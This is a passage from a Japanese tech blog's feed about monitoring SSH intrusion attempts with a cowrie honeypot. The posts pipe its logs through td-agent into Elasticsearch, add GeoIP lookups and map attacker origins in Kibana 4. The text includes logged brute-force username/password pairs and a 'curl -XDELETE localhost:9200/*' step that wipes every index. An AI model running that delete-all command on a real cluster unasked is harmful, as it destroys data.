class="number">32</span> /usr/bin/lastlog</span><br></pre></td></tr></table></figure>
<h2 id="lastlog__u306B_u3064_u3044_u3066"><a href="#lastlog__u306B_u3064_u3044_u3066" class="headerlink" title="lastlog について"></a>lastlog について</h2><p><code>lastlog</code> コマンドはユーザーの最近ログインした履歴を見ることが出来るもの。</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lastlog</span></span><br><span class="line">ユーザ名         ポート   場所             最近のログイン</span><br><span class="line">root                                       <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">bin                                        <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">daemon                                     <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">adm                                        <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">lp                                         <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">sync                                       <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">shutdown                                   <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">halt                                       <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">mail                                       <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">operator                                   <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">games                                      <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">ftp                                        <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">nobody                                     <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">avahi-autoipd                              <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">dbus                                       <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">chrony                                     <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line">test            pts/0    00-00-11-11.pp 月  8月 10 18:21:06 +0900 2015</span><br></pre></td></tr></table></figure>
<p><code>-u</code> オプションで指定したユーザーの直近のログインログを見ることが出来る。</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> lastlog -u postfix</span><br><span class="line">ユーザ名         ポート   場所             最近のログイン</span><br><span class="line">postfix                                    <span class="keyword">*</span><span class="keyword">*</span>一度もログインしていません<span class="keyword">*</span><span class="keyword">*</span></span><br></pre></td></tr></table></figure>
<p><code>-t days</code> daysをしていることで、指定したdays以内にログインしたユーザーの情報を得ることが出来る。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ lastlog -t <span class="number">100</span> | more</span><br><span class="line">ユーザ名         ポート   場所             最近のログイン</span><br><span class="line">test            pts/<span class="number">0</span>    <span class="number">00</span>-<span class="number">00</span>-<span class="number">11</span>-<span class="number">11.</span>pp 月  <span class="number">8</span>月 <span class="number">10</span> <span class="number">18</span>:<span class="number">21</span>:<span class="number">06</span> +<span class="number">0900</span> <span class="number">2015</span></span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<p>スペインから不正アクセスを記録した。</p>
<p>まずは、いつも通り動画をご覧いただこう。</p>]]>
    
    </summary>
    
      <category term="cowrie" scheme="http://atani.github.io/tags/cowrie/"/>
    
      <category term="honeypot" scheme="http://atani.github.io/tags/honeypot/"/>
    
      <category term="security" scheme="http://atani.github.io/tags/security/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[地理情報を取得して、どこから不正アクセスがあったのか分布図を出す。]]></title>
    <link href="http://atani.github.io/2015/08/cowrie-td-agent-elasticsearch-kibana4/"/>
    <id>http://atani.github.io/2015/08/cowrie-td-agent-elasticsearch-kibana4/</id>
    <published>2015-08-03T12:26:53.000Z</published>
    <updated>2015-08-03T12:29:26.000Z</updated>
    <content type="html"><![CDATA[<p>数回に分けて、cowrieでsshの不正アクセスの実態を取得するようにしてきた。</p>
<ol>
<li><a href="http://atani.github.io/2015/07/ハニーポットcowrieのログを、mariaDBで管理しよう%E3%80%82/">ハニーポットcowrieのログを、mariaDBで管理しよう</a></li>
<li><a href="http://atani.github.io/2015/07/cowrieの不正侵入ログをelasticsearchにデータを入れる/">cowrieの不正侵入ログをelasticsearchにデータを入れる</a></li>
<li><a href="http://atani.github.io/2015/07/td-agent2-2-1ではfilterが使えるように/">td-agent2-2-1ではfilterが使えるように</a></li>
</ol>
<p>構成としてはこのような感じ。</p>
<img src="/2015/08/cowrie-td-agent-elasticsearch-kibana4/image.jpg" alt="[image.jpg]" title="[image.jpg]">
<p>今回は不正アクセスIPを利用し、地理情報を得て、どの国からのアクセスが多いのかをkibana4を使って出してみた。</p>
<a id="more"></a>
<h2 id="GeoIP_u3092_u8A2D_u5B9A_u3059_u308B_u3002"><a href="#GeoIP_u3092_u8A2D_u5B9A_u3059_u308B_u3002" class="headerlink" title="GeoIPを設定する。"></a>GeoIPを設定する。</h2><p>geoipをインストールする。</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y <span class="keyword">install</span> geoip-devel</span><br></pre></td></tr></table></figure>
<p>地理情報のデータベースをアップデート</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/geoipupdate</span></span><br></pre></td></tr></table></figure>
<p>fluentdでgeoipを扱うプラグインをインストールする。</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="preprocessor">opt</span>/td-agent/embedded/<span class="keyword">bin/fluent-gem </span>install fluent-plugin-geoip</span><br></pre></td></tr></table></figure>
<h2 id="td-agent_u306E_u8A2D_u5B9A"><a href="#td-agent_u306E_u8A2D_u5B9A" class="headerlink" title="td-agentの設定"></a>td-agentの設定</h2><p> <code>td-agent.conf</code>でIPアドレスを元に国コードとロケーションを取得する。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;match geo.replicator.**&gt;</span></span><br><span class="line">  <span class="keyword">type</span> geoip</span><br><span class="line">  <span class="keyword">geoip_lookup_key</span> ip</span><br><span class="line">  <span class="tag">&lt;record&gt;</span></span><br><span class="line">    <span class="keyword">country</span>  <span class="cbracket">$&#123;country_code['ip']&#125;</span></span><br><span class="line">    <span class="keyword">location</span> <span class="cbracket">$&#123;latitude['ip']&#125;</span>,<span class="cbracket">$&#123;longitude['ip']&#125;</span></span><br><span class="line">  <span class="tag">&lt;/record&gt;</span></span><br><span class="line">  <span class="keyword">remove_tag_prefix</span> geo.</span><br><span class="line"><span class="tag">&lt;/match&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="elasticsearch_u306E_u8A2D_u5B9A"><a href="#elasticsearch_u306E_u8A2D_u5B9A" class="headerlink" title="elasticsearchの設定"></a>elasticsearchの設定</h2><p>デフォルトのままだと、全てstring扱いになり、地理情報として扱ってくれないので、いったんマッピングを削除</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XDELETE localhost:<span class="number">9200</span><span class="comment">/*</span></span><br></pre></td></tr></table></figure>
<p>独自に定義したjsonファイルを作成する。今回はこんな感じ。</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ cat mapping.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"mappings"</span>: &#123;</span><br><span class="line">      <span class="string">"cowrie"</span>: &#123;</span><br><span class="line">        <span class="string">"properties"</span>: &#123;</span><br><span class="line">          <span class="string">"country"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"string"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="string">"id"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"long"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="string">"ip"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"string"</span>,</span><br><span class="line">            <span class="string">"index"</span> : <span class="string">"not_analyzed"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="string">"location"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"geo_point"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="string">"password"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"string"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="string">"timestamp"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"date"</span>,</span><br><span class="line">            <span class="string">"format"</span>: <span class="string">"dateOptionalTime"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="string">"username"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"string"</span>,</span><br><span class="line">            <span class="string">"index"</span> : <span class="string">"not_analyzed"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>マッピングする。</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">curl</span> -XPUT localhost:<span class="number">9200</span>/cowrie --<span class="preprocessor">data</span>-<span class="keyword">binary </span><span class="comment">@mapping.json</span></span><br></pre></td></tr></table></figure>
<p>マッピングできているか確認</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">curl</span> -X GET -w - <span class="url">http://localhost:9200/_mapping?pritty</span> | jq -C <span class="string">'.'</span></span><br></pre></td></tr></table></figure>
<p>td-agentを再起動。</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">systemctl</span> restart td-agent</span><br></pre></td></tr></table></figure>
<p>データ入っているか確認</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">"http://localhost:9200/cowrie/search/_search?size=100&amp;pretty"</span> | tail</span><br><span class="line">      <span class="string">"_source"</span>:&#123;<span class="string">"id"</span>:<span class="number">491</span>,<span class="string">"timestamp"</span>:<span class="string">"2015-07-23T9:02:44+09:00"</span>,<span class="string">"ip"</span>:<span class="string">"213.136.89.235"</span>,<span class="string">"username"</span>:<span class="string">"melissa"</span>,<span class="string">"password"</span>:<span class="string">"melissa"</span>,<span class="string">"country"</span>:<span class="string">"DE"</span>,<span class="string">"location"</span>:<span class="string">"51.0,9.0"</span>&#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      <span class="string">"_index"</span> : <span class="string">"cowrie"</span>,</span><br><span class="line">      <span class="string">"_type"</span> : <span class="string">"search"</span>,</span><br><span class="line">      <span class="string">"_id"</span> : <span class="string">"496"</span>,</span><br><span class="line">      <span class="string">"_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">      <span class="string">"_source"</span>:&#123;<span class="string">"id"</span>:<span class="number">496</span>,<span class="string">"timestamp"</span>:<span class="string">"2015-07-23T9:04:52+09:00"</span>,<span class="string">"ip"</span>:<span class="string">"213.136.89.235"</span>,<span class="string">"username"</span>:<span class="string">"albert"</span>,<span class="string">"password"</span>:<span class="string">"albert"</span>,<span class="string">"country"</span>:<span class="string">"DE"</span>,<span class="string">"location"</span>:<span class="string">"51.0,9.0"</span>&#125;</span><br><span class="line">    &#125; ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="kibana4_u306E_u8A2D_u5B9A"><a href="#kibana4_u306E_u8A2D_u5B9A" class="headerlink" title="kibana4の設定"></a>kibana4の設定</h2><p>kibana4を使ってデータを可視化する。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//download.elastic.co/kibana/kibana/kibana-4.1.1-linux-x64.tar.gz</span></span><br><span class="line">tar zxf kibana-<span class="number">4.1</span><span class="number">.1</span>-linux-x64.tar.gz</span><br><span class="line">mv kibana-<span class="number">4.1</span><span class="number">.1</span>-linux-x64 kibana</span><br><span class="line">cd kibana</span><br><span class="line">./bin/kibana &amp;</span><br></pre></td></tr></table></figure>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">firewall</span><span class="literal">-</span><span class="comment">cmd</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">permanent</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">add</span><span class="literal">-</span><span class="comment">port</span> <span class="comment">5601/tcp</span></span><br><span class="line"><span class="comment">systemctl</span> <span class="comment">start</span> <span class="comment">firewalld</span><span class="string">.</span><span class="comment">service</span></span><br></pre></td></tr></table></figure>
<p><a href="http://localhost:5601/" target="_blank" rel="external">http://localhost:5601/</a> にアクセスするとこのような画面。</p>
<img src="/2015/08/cowrie-td-agent-elasticsearch-kibana4/top.png" alt="[top.png]" title="[top.png]">
<p>elasticsearchのマッピングで<code>location</code>の<code>type</code>を<code>geo_point</code>にしているのでこの<code>location</code>を用いて地図上にどの国からのアクセスが多いかを可視化した。</p>
<img src="/2015/08/cowrie-td-agent-elasticsearch-kibana4/location.png" alt="[location.png]" title="[location.png]">
<p>データを可視化すると見えないものが見えて来る。<br>是非、現場で活用してみてはいかがだろうか。</p>
<hr>
<h2 id="u53C2_u7167URL"><a href="#u53C2_u7167URL" class="headerlink" title="参照URL"></a>参照URL</h2><ul>
<li><a href="https://github.com/y-ken/fluent-plugin-geoip/blob/master/README.md" target="_blank" rel="external">fluent-plugin-geoip</a></li>
<li><a href="http://qiita.com/hiyuzawa/items/bad1a7e29fc8d1820bea" target="_blank" rel="external">Kibana 4.1.0 + ElasticSearch 1.6.0 でデータビジュアライズ</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>数回に分けて、cowrieでsshの不正アクセスの実態を取得するようにしてきた。</p>
<ol>
<li><a href="http://atani.github.io/2015/07/ハニーポットcowrieのログを、mariaDBで管理しよう%E3%80%82/">ハニーポットcowrieのログを、mariaDBで管理しよう</a></li>
<li><a href="http://atani.github.io/2015/07/cowrieの不正侵入ログをelasticsearchにデータを入れる/">cowrieの不正侵入ログをelasticsearchにデータを入れる</a></li>
<li><a href="http://atani.github.io/2015/07/td-agent2-2-1ではfilterが使えるように/">td-agent2-2-1ではfilterが使えるように</a></li>
</ol>
<p>構成としてはこのような感じ。</p>
<img src="/2015/08/cowrie-td-agent-elasticsearch-kibana4/image.jpg" alt="[image.jpg]" title="[image.jpg]">
<p>今回は不正アクセスIPを利用し、地理情報を得て、どの国からのアクセスが多いのかをkibana4を使って出してみた。</p>]]>
    
    </summary>
    
      <category term="cowrie" scheme="http://atani.github.io/tags/cowrie/"/>
    
      <category term="elasticsearch" scheme="http://atani.github.io/tags/elasticsearch/"/>
    
      <category term="geoip" scheme="http://atani.github.io/tags/geoip/"/>
    
      <category term="kibana4" scheme="http://atani.github.io/tags/kibana4/"/>
    
      <category term="td-agent" scheme="http://atani.github.io/tags/td-agent/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[td-agent2.2.1ではfilterが使えるように 備忘録]]></title>
    <link href="http://atani.github.io/2015/07/td-agent2-2-1%E3%81%A7%E3%81%AFfilter%E3%81%8C%E4%BD%BF%E3%81%88%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB/"/>
    <id>http://atani.github.io/2015/07/td-agent2-2-1ではfilterが使えるように/</id>
    <published>2015-07-31T13:58:00.000Z</published>
    <updated>2015-07-31T13:57:02.000Z</updated>
    <content type="html"><![CDATA[<p>前回、以下のような記事を書いた。 </p>
<p><a href="http://atani.github.io/2015/07/cowrieの不正侵入ログをelasticsearchにデータを入れる/">cowrieの不正侵入ログをelasticsearchにデータを入れる</a></p>
<p>すると、Masahiro Nakagawaさんから以下のようなコメントいただいた(ありがとうございます!!)</p>
<blockquote>
<p>最新版のtd-agent 2を使っているのであれば，stdout filterが入っているので，今ではcopyとstdoutを組み合わせる必要はなくて，<filter replicator.**="">type stdout</filter>で簡単にログに吐けるようになっています．今後はこちらもお試しください :)” — Masahiro Nakagawa<br>ref: <a href="http://disq.us/8o5gpu" target="_blank" rel="external">http://disq.us/8o5gpu</a></p>
</blockquote>
<p>そこで、<code>td-agent.conf</code> を以下のように書き換えてみた。</p>
<a id="more"></a>
<p>修正前</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">&lt;match replicator.**&gt;</span></span><br><span class="line">  type copy</span><br><span class="line">  <span class="variable">&lt;store&gt;</span></span><br><span class="line">  type stdout</span><br><span class="line">  <span class="variable">&lt;/store&gt;</span></span><br><span class="line">  <span class="variable">&lt;store&gt;</span></span><br><span class="line">  type mysql_replicator_elasticsearch</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Elasticsearchサーバの接続情報を指定</span></span><br><span class="line">  host localhost</span><br><span class="line">  <span class="keyword">port</span> <span class="number">9200</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Elasticsearchへレコードを登録する際の index(Database)、type(テーブル)、そしてunique id (primary_key)をどのようにタグから分解するか指定</span></span><br><span class="line">  tag_format (?<span class="variable">&lt;index_name&gt;</span>[^\.]+)\.(?<span class="variable">&lt;type_name&gt;</span>[^\.]+).(?<span class="variable">&lt;event&gt;</span>[^\.]+)\.(?<span class="variable">&lt;primary_key&gt;</span>[^\.]+)$</span><br><span class="line"></span><br><span class="line">  <span class="comment"># どの程度バッファに溜めてElasticsearchサーバへ転送するかを指定</span></span><br><span class="line">  flush_interval <span class="number">5</span>s</span><br><span class="line"></span><br><span class="line">  <span class="comment"># リトライ間隔の最大秒数 (fluentd &gt;= 0.10.41)</span></span><br><span class="line">  max_retry_wait <span class="number">1800</span></span><br><span class="line">  <span class="variable">&lt;/store&gt;</span></span><br><span class="line"><span class="variable">&lt;/match&gt;</span></span><br></pre></td></tr></table></figure>
<p>修正後</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">&lt;filter replicator.**&gt;</span></span><br><span class="line">  type stdout</span><br><span class="line"><span class="variable">&lt;/filter&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">&lt;match replicator.**&gt;</span></span><br><span class="line">  type mysql_replicator_elasticsearch</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Elasticsearchサーバの接続情報を指定</span></span><br><span class="line">  host localhost</span><br><span class="line">  <span class="keyword">port</span> <span class="number">9200</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Elasticsearchへレコードを登録する際の index(Database)、type(テーブル)、そしてunique id (primary_key)をどのようにタグから分解するか指定</span></span><br><span class="line">  tag_format (?<span class="variable">&lt;index_name&gt;</span>[^\.]+)\.(?<span class="variable">&lt;type_name&gt;</span>[^\.]+).(?<span class="variable">&lt;event&gt;</span>[^\.]+)\.(?<span class="variable">&lt;primary_key&gt;</span>[^\.]+)$</span><br><span class="line"></span><br><span class="line">  <span class="comment"># どの程度バッファに溜めてElasticsearchサーバへ転送するかを指定</span></span><br><span class="line">  flush_interval <span class="number">5</span>s</span><br><span class="line"></span><br><span class="line">  <span class="comment"># リトライ間隔の最大秒数 (fluentd &gt;= 0.10.41)</span></span><br><span class="line">  max_retry_wait <span class="number">1800</span></span><br><span class="line"><span class="variable">&lt;/match&gt;</span></span><br></pre></td></tr></table></figure>
<p>修正後は、td-agentを再起動し、問題なくElasticsearchにデータがinsertされるのを確認できた！</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>前回、以下のような記事を書いた。 </p>
<p><a href="http://atani.github.io/2015/07/cowrieの不正侵入ログをelasticsearchにデータを入れる/">cowrieの不正侵入ログをelasticsearchにデータを入れる</a></p>
<p>すると、Masahiro Nakagawaさんから以下のようなコメントいただいた(ありがとうございます!!)</p>
<blockquote>
<p>最新版のtd-agent 2を使っているのであれば，stdout filterが入っているので，今ではcopyとstdoutを組み合わせる必要はなくて，<filter replicator.**="">type stdout</filter>で簡単にログに吐けるようになっています．今後はこちらもお試しください :)” — Masahiro Nakagawa<br>ref: <a href="http://disq.us/8o5gpu">http://disq.us/8o5gpu</a></p>
</blockquote>
<p>そこで、<code>td-agent.conf</code> を以下のように書き換えてみた。</p>]]>
    
    </summary>
    
      <category term="cowrie" scheme="http://atani.github.io/tags/cowrie/"/>
    
      <category term="td-agent2" scheme="http://atani.github.io/tags/td-agent2/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[cowrieの不正侵入ログをelasticsearchにデータを入れる]]></title>
    <link href="http://atani.github.io/2015/07/cowrie%E3%81%AE%E4%B8%8D%E6%AD%A3%E4%BE%B5%E5%85%A5%E3%83%AD%E3%82%B0%E3%82%92elasticsearch%E3%81%AB%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E5%85%A5%E3%82%8C%E3%82%8B/"/>
    <id>http://atani.github.io/2015/07/cowrieの不正侵入ログをelasticsearchにデータを入れる/</id>
    <published>2015-07-25T14:16:26.000Z</published>
    <updated>2015-07-25T14:18:30.000Z</updated>
    <content type="html"><![CDATA[<p>前回の記事( <a href="http://atani.github.io/2015/07/ハニーポットcowrieのログを、mariaDBで管理しよう%E3%80%82/">ハニーポットcowrieのログを、mariaDBで管理しよう。</a> )でcowrieのログをmariaDBに出力するようにした。<br>今回は、そのデータをfluentd(td-agent2)を利用して、elasticsearchにデータを入れる手順をご紹介。</p>
<p>fluentdとは…ログを収集して様々な形式で格納できるソフトウェア<br>td-agent2とは…fluentdのラッパープログラム<br>elasticsearchとは…全文検索を提供するソフトウェア(サーチエンジン)</p>
<p>これらを入れることで次回ご紹介する解析に非常に有用になってくる。</p>
<a id="more"></a>
<h2 id="Elasticsearch_u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB"><a href="#Elasticsearch_u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB" class="headerlink" title="Elasticsearchをインストール"></a>Elasticsearchをインストール</h2><p>Elasticsearchが動作するのに必要であるjavaをインストールする。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y <span class="operator"><span class="keyword">install</span> <span class="keyword">java</span></span></span><br></pre></td></tr></table></figure>
<p>GPG-KEYをインポートしたあと、yumのレポジトリの設定を行う。</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm --<span class="keyword">import</span> <span class="string">https:</span><span class="comment">//packages.elastic.co/GPG-KEY-elasticsearch</span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat&lt;&lt;_HERE_&gt;/etc/yum<span class="class">.repos</span><span class="class">.d</span>/elasticsearch<span class="class">.repo</span></span><br><span class="line">[elasticsearch-<span class="number">1.6</span>]</span><br><span class="line">name=Elasticsearch repository <span class="keyword">for</span> <span class="number">1.6</span><span class="class">.x</span> packages</span><br><span class="line">baseurl=http:<span class="comment">//packages.elastic.co/elasticsearch/1.6/centos</span></span><br><span class="line">gpgcheck=<span class="number">1</span></span><br><span class="line">gpgkey=http:<span class="comment">//packages.elastic.co/GPG-KEY-elasticsearch</span></span><br><span class="line">enabled=<span class="number">1</span></span><br><span class="line">_HERE_</span><br></pre></td></tr></table></figure>
<p>Elasticsearchをインストール</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y <span class="keyword">install</span> elasticsearch</span><br></pre></td></tr></table></figure>
<p>Elasticsearchを起動する。</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> elasticsearch.service</span><br></pre></td></tr></table></figure>
<p>自動起動の設定をする。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> elasticsearch.service</span><br></pre></td></tr></table></figure>
<p>Elasticsearchにアクセスしてみて、以下のようなJSON形式の結果が返って来ればOK</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">"http://localhost:9200"</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"status"</span> : <span class="number">200</span>,</span><br><span class="line">  <span class="string">"name"</span> : <span class="string">"Speed"</span>,</span><br><span class="line">  <span class="string">"cluster_name"</span> : <span class="string">"elasticsearch"</span>,</span><br><span class="line">  <span class="string">"version"</span> : &#123;</span><br><span class="line">    <span class="string">"number"</span> : <span class="string">"1.6.1"</span>,</span><br><span class="line">    <span class="string">"build_hash"</span> : <span class="string">"e72f2849e1c52f2a7b87196b36e687f851a30a6a"</span>,</span><br><span class="line">    <span class="string">"build_timestamp"</span> : <span class="string">"2015-07-16T14:06:55Z"</span>,</span><br><span class="line">    <span class="string">"build_snapshot"</span> : <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"lucene_version"</span> : <span class="string">"4.10.4"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"tagline"</span> : <span class="string">"You Know, for Search"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
